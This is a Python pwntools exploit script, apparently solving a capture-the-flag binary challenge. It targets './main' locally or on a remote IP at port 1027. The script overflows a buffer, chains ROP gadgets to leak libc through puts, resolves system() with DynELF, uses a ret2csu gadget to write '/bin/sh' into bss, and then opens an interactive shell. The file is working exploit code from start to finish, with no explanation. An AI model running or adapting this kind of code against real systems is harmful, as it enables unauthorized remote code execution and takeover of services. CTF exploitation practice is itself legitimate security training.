from pwn import *
import subprocess
import sys

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']
context.log_level = 'debug'

gdb_script = 'b* 0x400A29'

DEBUG = [False, True][int(sys.argv[1])]
if DEBUG:
    r = process('./main')
    gdb.attach(r, gdb_script)
    libc_name = './libc.so.6'
else:
    r = remote('54.225.38.91', 1027)
    libc_name = './libc-2.11.1.so'

elf = ELF('./main')
libc = ELF(libc_name)
puts_plt = elf.symbols['puts']
puts_got = elf.got['puts']
read_got = elf.got['read']

main = elf.symbols['main']

pop_rdi = 0x0000000000400a93
pop_rsi_r14 = 0x0000000000400a91
ret = 0x00000000004006e6
bss = elf.bss() + 0x100

one_gadgets = map(int,subprocess.check_output(['one_gadget', '--raw', libc_name]).split(' '))

go = lambda x: r.sendlineafter('> ', str(x))
ii = lambda x: r.sendlineafter(':', str(x))
i0 = lambda x: r.sendafter(':', str(x))
def csu(rdi, rsi, rdx, f):
    p = p64(0x400A8A)
    p += p64(0)
    p += p64(1)
    p += p64(f)
    p += p64(rdi)
    p += p64(rsi)
    p += p64(rdx)
    p += p64(0x400A70)
    p += p64(0) * 7
    return p

r.recvuntil(':')
r.sendline('-99')
r.recvuntil(':')
r.sendline('--99')

p = 'a'*0x78
p += p64(pop_rdi)
p += p64(puts_got)
p += p64(puts_plt)
p += p64(main)
r.recvuntil(':')
r.send(p)

r.recvuntil('!\n')
libc_leak = u64((r.recvuntil('\n'))[:-1].ljust(8,'\x00'))
libc_base = libc_leak - libc.symbols['puts'] - 0x1c000
log.info('libc leak: 0x%x' % libc_leak)
log.info('libc base: 0x%x' % libc_base)


def leak_libc(addr):
    r.recvuntil(':')
    r.sendline('--9')
    r.recvuntil(':')
    p = 'b'*0x78
    p += p64(pop_rdi)
    p += p64(addr)
    p += p64(puts_plt)
    p += p64(main)
    r.recvuntil(':')
    r.send(p)
    r.recvuntil('!\n')
    ret = (r.recvuntil('\nWelcome'))[:-8]
    return ret + '\x00'

d = DynELF(leak_libc, libc_base)
system_addr = d.lookup('system')
log.info('system_addr: 0x%x' % system_addr)

r.recvuntil(':')
r.sendline('--9')
r.recvuntil(':')
p = 'b'*0x78
p += csu(0, bss, 0x20, elf.got['read'])
p += p64(pop_rdi)
p += p64(bss)
p += p64(system_addr)
r.recvuntil(':')
r.send(p)

sleep(0.3)
r.send('/bin/sh\x00')

r.interactive()
